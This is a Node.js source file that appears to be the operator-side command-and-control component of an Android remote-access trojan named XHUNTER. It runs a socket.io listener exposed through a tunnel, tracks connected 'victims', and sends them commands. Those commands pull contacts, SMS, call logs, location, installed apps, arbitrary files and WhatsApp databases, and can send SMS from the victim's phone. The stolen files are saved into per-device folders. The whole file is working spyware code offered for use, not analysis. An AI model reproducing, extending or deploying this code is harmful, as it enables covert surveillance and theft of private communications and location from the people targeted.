var rn_bridge = require('rn-bridge');
var fs = require('fs');
const localtunnel = require('localtunnel');
const express = require('express');
const app = express()
const server = require('http').createServer(app)
const { Server } = require('socket.io')
const io = new Server(server, {
  maxHttpBufferSize: 1e8, // 100mb
});
const ioc = require('socket.io-client');

var socket=null;
var tunnel=null;
var victimList={};
var deviceList={};
const port = 8080;

const connect=(ip)=>{
    socket = ioc(ip);
    socket.connect();
    socket.emit("adminJoin")
    socket.on('connect', () => {
      log("Connected!!")
      rn_bridge.channel.post('listnerStarted');
    });
    socket.on('join',(device)=>{
      log("Victim joined => "+JSON.stringify(device.socketId));
      victimList[device.id] =  device.socketId;
      deviceList[socket.id] =  {
        "id":  device.id,
        "model":  device.model
      }
      rn_bridge.channel.post('deviceJoined',JSON.stringify(device));
    });
    socket.on('getDir',(data)=>{
      rn_bridge.channel.post('getDir',JSON.stringify(data));
    });
    socket.on('getInstalledApps',(data)=>{
      rn_bridge.channel.post('getInstalledApps',JSON.stringify(data));
    });
    socket.on('getContacts',(data)=>{
      rn_bridge.channel.post('getContacts',JSON.stringify(data));
    });
    socket.on('sendSMS',(data)=>{
      rn_bridge.channel.post('sendSMS',JSON.stringify(data));
    });
    socket.on('getCallLog',(data)=>{
      rn_bridge.channel.post('getCallLog',JSON.stringify(data));
    });  
    socket.on('getLocation',(data)=>{
      rn_bridge.channel.post('getLocation',JSON.stringify(data));
    });
    socket.on("download", (d) => {
      if(fs.existsSync(`/storage/emulated/0/XHUNTER`)){
        if(fs.existsSync(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})`)){
          fs.appendFile(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})/${d.fileName}`, Buffer.from(d.fileData), function (err) {
            if (err) log(err);
            rn_bridge.channel.post('download',JSON.stringify(Math.round((d.fileUploadedSize*100)/d.fileSize)));
          });
        }else{
          fs.mkdirSync(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})`);
          fs.appendFile(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})/${d.fileName}`, Buffer.from(d.fileData), function (err) {
            if (err) log(err);
            rn_bridge.channel.post('download',JSON.stringify(Math.round((d.fileUploadedSize*100)/d.fileSize)));
          });
        }
      }else{
          fs.mkdirSync(`/storage/emulated/0/XHUNTER`);
          fs.mkdirSync(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})`);
          fs.appendFile(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})/${d.fileName}`, Buffer.from(d.fileData), function (err) {
            if (err) log(err);
            rn_bridge.channel.post('download',JSON.stringify(Math.round((d.fileUploadedSize*100)/d.fileSize)));
          });
      }
    });
    socket.on("downloadWhatsappDatabase", (d) => {
      if(fs.existsSync(`/storage/emulated/0/XHUNTER`)){
        if(fs.existsSync(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})`)){
          fs.appendFile(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})/${d.fileName}`, Buffer.from(d.fileData), function (err) {
            if (err) log(err);
            rn_bridge.channel.post('downloadWhatsappDatabase',JSON.stringify(Math.round((d.fileUploadedSize*100)/d.fileSize)));
          });
        }else{
          fs.mkdirSync(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})`);
          fs.appendFile(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})/${d.fileName}`, Buffer.from(d.fileData), function (err) {
            if (err) log(err);
            rn_bridge.channel.post('downloadWhatsappDatabase',JSON.stringify(Math.round((d.fileUploadedSize*100)/d.fileSize)));
          });
        }
      }else{
          fs.mkdirSync(`/storage/emulated/0/XHUNTER`);
          fs.mkdirSync(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})`);
          fs.appendFile(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})/${d.fileName}`, Buffer.from(d.fileData), function (err) {
            if (err) log(err);
            rn_bridge.channel.post('downloadWhatsappDatabase',JSON.stringify(Math.round((d.fileUploadedSize*100)/d.fileSize)));
          });
      }
     });
     socket.on("previewImage", (fileData) => {
      rn_bridge.channel.post('previewImage',JSON.stringify(fileData));
     });
    socket.on("error", (data) => {
      rn_bridge.channel.post('error',JSON.stringify(data));
     });
    socket.on("getSMS", (data) => {
      rn_bridge.channel.post('getSMS',JSON.stringify(data));
     });
     socket.on('disconnectClient', (id) => {
      log('Victim Disconnected !'+ id)
      Object.keys(victimList).map((key)=>{
        if(victimList[key] === id){
          rn_bridge.channel.post('deviceDisconnected',key);
        }
      })
    });
}

const startListener=(subdomain)=>{
server.listen(port, (err) => {
    if (err) return;
    if(subdomain){
    (async () => {
      tunnel = await localtunnel({ port: 8080, subdomain });
      rn_bridge.channel.post('listnerStarted');
      log("URL =>  " + tunnel.url);
      })();
    }else{
      rn_bridge.channel.post('listnerStarted');
    }
});
io.on('connection', (socket) => {
    socket.on('join',(device)=>{
      log("Victim joined => "+JSON.stringify(device.id));
      victimList[device.id] =  socket.id;
      deviceList[socket.id] =  {
        "id":  device.id,
        "model":  device.model
      }
      rn_bridge.channel.post('deviceJoined',JSON.stringify(device));
    });
    socket.on('getDir',(data)=>{
      rn_bridge.channel.post('getDir',JSON.stringify(data));
    });
    socket.on('getInstalledApps',(data)=>{
      rn_bridge.channel.post('getInstalledApps',JSON.stringify(data));
    });
    socket.on('getContacts',(data)=>{
      rn_bridge.channel.post('getContacts',JSON.stringify(data));
    });
    socket.on('sendSMS',(data)=>{
      rn_bridge.channel.post('sendSMS',JSON.stringify(data));
    });
    socket.on('getCallLog',(data)=>{
      rn_bridge.channel.post('getCallLog',JSON.stringify(data));
    });
    socket.on('getLocation',(data)=>{
      rn_bridge.channel.post('getLocation',JSON.stringify(data));
    });
   
    socket.on("download", (d, callback) => {
      if(fs.existsSync(`/storage/emulated/0/XHUNTER`)){
        if(fs.existsSync(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})`)){
          fs.appendFile(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})/${d.fileName}`, Buffer.from(d.fileData), function (err) {
            if (err) log(err);
            rn_bridge.channel.post('download',JSON.stringify(Math.round((d.fileUploadedSize*100)/d.fileSize)));
            setTimeout(()=>{
              callback("success")
            },2000)
          });
        }else{
          fs.mkdirSync(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})`);
          fs.appendFile(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})/${d.fileName}`, Buffer.from(d.fileData), function (err) {
            if (err) log(err);
            rn_bridge.channel.post('download',JSON.stringify(Math.round((d.fileUploadedSize*100)/d.fileSize)));
            setTimeout(()=>{
              callback("success")
            },2000)
          });
        }
      }else{
          fs.mkdirSync(`/storage/emulated/0/XHUNTER`);
          fs.mkdirSync(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})`);
          fs.appendFile(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})/${d.fileName}`, Buffer.from(d.fileData), function (err) {
            if (err) log(err);
            rn_bridge.channel.post('download',JSON.stringify(Math.round((d.fileUploadedSize*100)/d.fileSize)));
            setTimeout(()=>{
              callback("success")
            },2000)
          });
      }
    });


    socket.on("downloadWhatsappDatabase", (d, callback) => {
      if(fs.existsSync(`/storage/emulated/0/XHUNTER`)){
        if(fs.existsSync(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})`)){
          fs.appendFile(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})/${d.fileName}`, Buffer.from(d.fileData), function (err) {
            if (err) log(err);
            rn_bridge.channel.post('downloadWhatsappDatabase',JSON.stringify(Math.round((d.fileUploadedSize*100)/d.fileSize)));
            setTimeout(()=>{
              callback("success")
            },2000)
          });
        }else{
          fs.mkdirSync(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})`);
          fs.appendFile(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})/${d.fileName}`, Buffer.from(d.fileData), function (err) {
            if (err) log(err);
            rn_bridge.channel.post('downloadWhatsappDatabase',JSON.stringify(Math.round((d.fileUploadedSize*100)/d.fileSize)));
            setTimeout(()=>{
              callback("success")
            },2000)
          });
        }
      }else{
          fs.mkdirSync(`/storage/emulated/0/XHUNTER`);
          fs.mkdirSync(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})`);
          fs.appendFile(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})/${d.fileName}`, Buffer.from(d.fileData), function (err) {
            if (err) log(err);
            rn_bridge.channel.post('downloadWhatsappDatabase',JSON.stringify(Math.round((d.fileUploadedSize*100)/d.fileSize)));
            setTimeout(()=>{
              callback("success")
            },2000)
          });
      }
     });

    socket.on("previewImage", (fileData) => {
      rn_bridge.channel.post('previewImage',JSON.stringify(fileData));
     });
    socket.on("error", (data) => {
      rn_bridge.channel.post('error',JSON.stringify(data));
     });
     socket.on("getSMS", (data) => {
      rn_bridge.channel.post('getSMS',JSON.stringify(data));
     });
    socket.on('disconnect', () => {
      log('Victim Disconnected !'+ socket.id)
      Object.keys(victimList).map((key)=>{
        if(victimList[key] === socket.id){
          rn_bridge.channel.post('deviceDisconnected',key);
        }
      })
    });
  })
}//startListener function close 

const send =(d)=>{
  if(socket){
    socket.emit('request',d)
  }else{
    let { to, action, data } = JSON.parse(d);
    log("sending to "+ to +" < -- >"+victimList[to]+" : "+action);
    io.to(victimList[to]).emit(action, data);
  }
}

const stopListener =()=>{
  if(server.listening){
    server.close();
  }
  if(tunnel){
    tunnel.close();
  }
  if(socket){
    socket.close();
    socket=null;
  }
  log("Server stopped")
}

rn_bridge.channel.on('startListener', (arg) => {
  try {
    startListener(arg)
  } catch (err) {
    log(JSON.stringify(err));
  }
});

rn_bridge.channel.on('cmd', (data) => {
  try {
    send(data)
  } catch (err) {
    log("Error: " + JSON.stringify(err) + " => " + err.stack );
  }
});

rn_bridge.channel.on('stopListener', () => {
  try {
    stopListener()
  } catch (err) {
    log(JSON.stringify(err));
  }
});

rn_bridge.channel.on('connect', (ip) => {
  try {
    log("Connecting...  "+ip)
    connect(ip)
  } catch (err) {
    log(JSON.stringify(err));
  }
});

const log = (log) =>{
  rn_bridge.channel.post('log',log);
}